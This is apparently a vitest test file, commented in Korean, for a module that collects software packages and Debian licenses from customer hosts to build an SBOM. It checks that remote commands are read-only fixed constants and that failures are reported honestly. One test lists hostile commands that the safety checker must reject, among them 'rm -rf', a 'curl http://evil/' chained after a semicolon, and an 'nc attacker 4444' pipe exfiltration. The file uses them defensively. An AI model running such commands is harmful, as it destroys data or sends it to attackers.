// 패키지 수집 — [2026-08-04 파트너 지적 · 계획서 중-7]
//
// ★ 지적: "Tenable은 CPE만 기준이라 정보가 제한된다. SBOM에는 Package나 Library가 들어가야 한다."
//   확인해 보니 맞았다 — 스캐너로 들어온 호스트의 구성요소는 **OS·커널 2~3개뿐**이고
//   버전·라이선스는 `-`였다.
//
// ⚠ 이 시험이 지키는 것 중 가장 중요한 것: **원격으로 보내는 명령이 읽기 전용인가.**
//   여기 명령은 고객 장비에서 돈다. 쓰기 명령이 하나 섞이면 고객 장비가 바뀐다.
import { describe, expect, it, vi } from "vitest";
import * as fs from "fs";

vi.mock("../src/engine/llm", () => ({
  chat: vi.fn(async () => "[mock]"),
  embed: vi.fn(async (t: string[]) => t.map(() => [0.1, 0.2, 0.3])),
  registerLlmRoutes: vi.fn(),
}));

import {
  수집명령, 안전한명령인가, 장비종류판별, 패키지파싱, 패키지수집, 구성요소합치기, 덮는범위글,
  데비안라이선스명령, 데비안라이선스파싱, 라이선스채우기,
} from "../src/engine/packagescan";
import type { RunFn } from "../src/engine/hardeningscan";

const 가짜실행 = (표: Record<string, { code?: number; out?: string; err?: string }>): RunFn =>
  async (cmd) => {
    const 키 = Object.keys(표).find((k) => cmd.includes(k));
    const r = 키 ? 표[키] : { code: 127, out: "", err: "not found" };
    return { code: r.code ?? 0, out: r.out ?? "", err: r.err ?? "" };
  };

describe("★ 원격으로 보내는 명령이 읽기 전용인가", () => {
  it("수집 명령 전부가 읽기 전용이다 — 이게 무너지면 고객 장비가 바뀐다", () => {
    // ⚠ 수집명령만 돌면 **나중에 더한 명령이 감시 밖으로 샌다**(2026-08-05 실측: 데비안
    //   라이선스 명령을 더했을 때 이 시험이 안 봤다). 원격으로 나가는 명령을 전부 넣는다.
    const 원격명령 = { ...수집명령, 데비안라이선스: 데비안라이선스명령 };
    for (const [종류, cmd] of Object.entries(원격명령)) {
      expect(안전한명령인가(cmd), `${종류} 명령이 읽기 전용이 아니다: ${cmd}`).toBe(true);
    }
  });

  it("★★ 진짜 방패 — 명령이 **고정 상수**이고 문자열을 이어붙이지 않는다", () => {
    // 검사기는 두 번째 그물일 뿐이다. 진짜 안전은 "사용자 입력이 명령에 들어갈 길이 없다"는 것.
    // 소스를 읽어 수집명령 정의 안에 변수 끼워 넣기(템플릿 리터럴 ${}·+ 이어붙이기)가 없는지 본다.
    const src = fs.readFileSync(new URL("../src/engine/packagescan.ts", import.meta.url), "utf8");
    const 시작 = src.indexOf("export const 수집명령");
    const 끝 = src.indexOf("};", 시작);
    expect(시작, "수집명령을 못 찾았다 — 이 시험이 헛돌고 있다").toBeGreaterThan(0);
    const 본문 = src.slice(시작, 끝);
    expect(본문.length).toBeGreaterThan(200);
    // ⚠ 주석은 **먼저 걷어 낸다**(2026-08-05). 주석에 적은 백틱까지 실패로 잡으면
    //   "설명을 쓰면 시험이 깨지는" 그물이 되어, 다음 사람이 그물을 느슨하게 풀게 된다.
    //   막아야 할 것은 **명령 문자열 안의** 값 끼워 넣기다.
    const 코드 = 본문.replace(/\/\/[^\n]*/g, "");
    // 백틱 템플릿(값 끼워 넣기)과 문자열 더하기가 없어야 한다.
    expect(코드, "명령에 값을 끼워 넣으면 그 값이 셸로 간다").not.toMatch(/`/);
    expect(코드, "명령을 문자열로 이어붙이지 않는다").not.toMatch(/"\s*\+|\+\s*"/);
  });

  it("★ 이 검사가 헛돌지 않는다 — 쓰기 명령은 실제로 걸린다", () => {
    // 검사기가 무조건 true를 주면 위 시험이 저절로 통과한다. 걸려야 할 것을 넣어 본다.
    for (const 나쁜 of [
      "rm -rf /tmp/x",
      "yum install httpd",
      "systemctl restart sshd",
      "powershell -Command \"Remove-Item C:\\x\"",
      "rpm -qa; curl http://evil/",         // 명령 이어붙이기
      "rpm -qa | nc attacker 4444",          // 파이프로 내보내기
    ]) {
      expect(안전한명령인가(나쁜), `막았어야 할 명령이 통과한다: ${나쁜}`).toBe(false);
    }
  });
});

describe("★ 묻는 말이 장비 접속으로 가면 안 된다 — 라우팅", () => {
  // 실측(2026-08-04): 「SBOM 얼마나 채워졌어?」가 **결재판(장비 접속)**으로 갔다.
  //   「채워졌어?」(묻기)와 「채워줘」(시키기)를 못 가른 탓이다. 순서로 한 번,
  //   시킴꼴 조건으로 또 한 번 막았다 — 그 두 겹이 살아 있는지 소스로 확인한다.
  const src = fs.readFileSync(new URL("../src/engine/agentloop.ts", import.meta.url), "utf8");
  const 시작 = src.indexOf("// SBOM 부품 —");
  const 끝 = src.indexOf("// 점수 영향", 시작);

  it("조회 규칙이 수집 규칙보다 **앞에** 있다(배열 순서 = 우선순위)", () => {
    expect(시작, "SBOM 라우팅 묶음을 못 찾았다 — 이 시험이 헛돌고 있다").toBeGreaterThan(0);
    const 묶음 = src.slice(시작, 끝);
    expect(묶음.length).toBeGreaterThan(300);
    expect(묶음.indexOf("sbom_coverage"), "조회가 먼저여야 한다").toBeLessThan(묶음.indexOf("collect_packages"));
  });

  it("수집 규칙이 **시킴꼴**을 요구한다", () => {
    const 묶음 = src.slice(시작, 끝);
    const 수집줄 = 묶음.slice(묶음.indexOf("collect_packages") - 400, 묶음.indexOf("collect_packages"));
    expect(수집줄, "「줘/주세요」 같은 시킴꼴 없이 잡으면 묻는 말이 장비 접속으로 간다").toMatch(/줘|주세요/);
  });
});

describe("패키지파싱 — 탭으로 나눈다", () => {
  it("★ 이름에 공백이 있어도 한 부품이다 — 공백으로 나누면 부품 수가 부풀려진다", () => {
    const out = "Microsoft Visual C++ 2015 Redistributable\t14.0.24215\tMicrosoft Corporation";
    const r = 패키지파싱("windows", out);
    expect(r).toHaveLength(1);
    expect(r[0].name).toBe("Microsoft Visual C++ 2015 Redistributable");
    expect(r[0].version).toBe("14.0.24215");
  });

  it("rpm 출력에서 이름·버전·라이선스를 읽는다", () => {
    const r = 패키지파싱("rpm", "openssl\t1.1.1k-9.el8\tOpenSSL and SSLeay\nbash\t4.4.20-4.el8\tGPLv3+");
    expect(r).toHaveLength(2);
    expect(r[0]).toMatchObject({ name: "openssl", version: "1.1.1k-9.el8", license: "OpenSSL and SSLeay", from: "package" });
  });

  it("⚠ 라이선스를 못 읽으면 비운다 — 아는 척하지 않는다(법무가 보는 칸이다)", () => {
    const r = 패키지파싱("deb", "curl\t7.68.0-1ubuntu2.7\t");
    expect(r[0].license).toBe("-");
  });

  it("아키텍처별 중복은 한 번만 센다", () => {
    const r = 패키지파싱("rpm", "glibc\t2.28-225.el8\tLGPLv2+\nglibc\t2.28-225.el8\tLGPLv2+");
    expect(r).toHaveLength(1);
  });

  it("빈 줄·이름 없는 줄은 버린다", () => {
    expect(패키지파싱("rpm", "\n\n\t1.0\tMIT\n")).toHaveLength(0);
  });
});

describe("패키지수집 — 실패를 성공처럼 만들지 않는다", () => {
  it("rpm 장비를 알아보고 읽는다", async () => {
    const r = await 패키지수집(가짜실행({
      "command -v rpm": { out: "rpm" },
      "rpm -qa": { out: "openssl\t1.1.1k\tOpenSSL\nbash\t4.4\tGPLv3+" },
    }));
    expect(r.ok).toBe(true);
    expect(r.종류).toBe("rpm");
    expect(r.부품).toHaveLength(2);
    expect(r.말).toContain("2개");
  });

  it("★ 패키지 관리자가 없으면 「부품 없음」이 아니라 「못 읽었다」고 말한다", async () => {
    const r = await 패키지수집(가짜실행({ "command -v rpm": { out: "unknown" } }));
    expect(r.ok).toBe(false);
    expect(r.부품).toHaveLength(0);
    expect(r.말, "없다와 못 읽었다를 가르지 않으면 SBOM이 거짓이 된다").toContain("없다는 뜻이 아닙니다");
  });

  it("★ 명령이 실패하면 사유를 그대로 전한다", async () => {
    const r = await 패키지수집(가짜실행({
      "command -v rpm": { out: "deb" },
      "dpkg-query": { code: 1, out: "", err: "Permission denied" },
    }));
    expect(r.ok).toBe(false);
    expect(r.말).toContain("Permission denied");
    expect(r.말).toContain("없다는 뜻이 아닙니다");
  });

  it("명령은 돌았는데 0개면 그것도 실패로 본다 — 형식이 다를 수 있다", async () => {
    const r = await 패키지수집(가짜실행({
      "command -v rpm": { out: "rpm" },
      "rpm -qa": { out: "알 수 없는 형식입니다" },
    }));
    // 이름만 있는 한 줄이라 부품 1개로 읽힌다 — 그건 성공이다. 진짜 0개인 경우를 본다.
    const r2 = await 패키지수집(가짜실행({ "command -v rpm": { out: "rpm" }, "rpm -qa": { out: "\n\n" } }));
    expect(r2.ok).toBe(false);
    expect(r2.말).toContain("0개");
    expect(r.ok).toBe(true); // 대조군 — 검사가 무조건 실패를 주지 않는다
  });

  it("윈도우는 판별 명령을 안 돌리고 바로 읽는다", async () => {
    const r = await 패키지수집(가짜실행({ powershell: { out: "7-Zip 23.01\t23.01\tIgor Pavlov" } }), true);
    expect(r.종류).toBe("windows");
    expect(r.부품[0].name).toBe("7-Zip 23.01");
  });
});

describe("구성요소합치기 — 스캐너가 준 것을 지우지 않는다", () => {
  it("같은 이름은 **직접 읽은 쪽**이 이긴다", () => {
    const 기존 = [{ name: "openssl", version: "-", license: "-", from: "scanner" as const }];
    const 새것 = [{ name: "OpenSSL", version: "1.1.1k", license: "OpenSSL", from: "package" as const }];
    const r = 구성요소합치기(기존, 새것);
    expect(r).toHaveLength(1);
    expect(r[0].version, "장비에서 직접 읽은 버전이 남아야 한다").toBe("1.1.1k");
  });

  it("스캐너에만 있는 것(OS·배포판)은 그대로 둔다", () => {
    const 기존 = [{ name: "Red Hat Enterprise Linux 8.10", version: "-", license: "-", from: "scanner" as const }];
    const r = 구성요소합치기(기존, [{ name: "bash", version: "4.4", license: "GPLv3+", from: "package" as const }]);
    expect(r).toHaveLength(2);
  });
});

describe("덮는범위글 — 부품 수가 실제보다 정확해 보이지 않게", () => {
  it("직접 읽은 것과 스캐너가 준 것을 갈라 적는다", () => {
    const 글 = 덮는범위글([
      { name: "RHEL 8.10", version: "-", license: "-", from: "scanner" },
      { name: "bash", version: "4.4", license: "GPLv3+", from: "package" },
    ]);
    expect(글).toContain("직접 읽은 것 1개");
    expect(글).toContain("스캐너가 준 것 1개");
  });

  it("★ 직접 읽은 부품이 하나도 없으면 CPE 수준이라고 밝힌다", () => {
    const 글 = 덮는범위글([{ name: "RHEL 8.10", version: "-", license: "-", from: "scanner" }]);
    expect(글, "이 고지가 없으면 파트너가 지적한 그 상태를 감추는 것이다").toContain("CPE");
  });
});

// ── 데비안 라이선스 채우기 (2026-08-05, 중-7) ───────────────────────────────────
// ★ 실측이 시킨 일: 운영 부품 844개 중 789개가 **장비에서 직접 읽은 것**인데 라이선스가
//   전부 "-"였다. dpkg-query가 라이선스 칸을 안 주기 때문이다(데비안은 copyright에 적는다).
describe("데비안 라이선스 채우기", () => {
  it("copyright 출력에서 {패키지 → 라이선스}를 뽑는다", () => {
    const out = [
      "/usr/share/doc/curl/copyright:License: curl",
      "/usr/share/doc/openssl/copyright:License: OpenSSL and SSLeay",
      "/usr/share/doc/zlib1g/copyright:License: Zlib",
      "쓰레기 줄",
      "/usr/share/doc/bash/copyright:Files: *",         // License: 줄이 아니면 무시
    ].join("\n");
    const 표 = 데비안라이선스파싱(out);
    expect(표.curl).toBe("curl");
    expect(표.zlib1g).toBe("Zlib");
    // "A and B"는 앞부분만 — 첫 줄 하나로 정확한 조합을 단정하지 않는다.
    expect(표.openssl).toBe("OpenSSL");
    expect(표.bash).toBeUndefined();
  });

  it("★ 아는 라이선스를 덮지 않고, 모르는 것은 지어내지 않는다", () => {
    const 부품 = [
      { name: "curl", version: "8.5", license: "-" },
      { name: "rpmpkg", version: "1.0", license: "MIT" },   // 이미 아는 값
      { name: "없는것", version: "1.0", license: "-" },
    ];
    const 결과 = 라이선스채우기(부품 as never, { curl: "curl", rpmpkg: "GPL-3" });
    expect(결과[0].license).toBe("curl");     // 채워졌다
    expect(결과[1].license).toBe("MIT");      // rpm이 준 값을 덮지 않는다
    expect(결과[2].license).toBe("-");        // 모르면 모른 채로 둔다
  });

  it("deb 장비면 라이선스 명령을 한 번 더 돌려 채운다", async () => {
    const r = await 패키지수집(
      가짜실행({
        "command -v rpm": { out: "deb" },
        "dpkg-query": { out: "curl\t8.5\t\nzlib1g\t1.3\t\n" },
        "grep -m1 -H": { out: "/usr/share/doc/curl/copyright:License: curl\n" },
      }),
    );
    expect(r.ok).toBe(true);
    expect(r.부품.find((c) => c.name === "curl")?.license).toBe("curl");
    expect(r.부품.find((c) => c.name === "zlib1g")?.license).toBe("-");
    expect(r.말).toContain("라이선스 1개를 더 읽었습니다");
    expect(r.말).toContain("1개는 라이선스를 못 읽었습니다");   // 남은 것을 감추지 않는다
  });

  it("라이선스 명령이 실패해도 패키지 목록은 살아 있다", async () => {
    const r = await 패키지수집(
      가짜실행({
        "command -v rpm": { out: "deb" },
        "dpkg-query": { out: "curl\t8.5\t\n" },
        "grep -m1 -H": { code: 2, out: "", err: "No such file" },
      }),
    );
    expect(r.ok).toBe(true);
    expect(r.부품).toHaveLength(1);
    expect(r.부품[0].license).toBe("-");
  });

  it("rpm 장비에는 라이선스 명령을 돌리지 않는다 — 이미 라이선스를 준다", async () => {
    const 부른명령: string[] = [];
    const 실행: RunFn = async (cmd) => {
      부른명령.push(cmd);
      if (cmd.includes("command -v rpm")) return { code: 0, out: "rpm", err: "" };
      return { code: 0, out: "curl\t8.5\tMIT\n", err: "" };
    };
    const r = await 패키지수집(실행);
    expect(r.부품[0].license).toBe("MIT");
    expect(부른명령.some((c) => c.includes("grep -m1 -H")), "rpm인데 라이선스 명령을 돌렸다").toBe(false);
  });
});
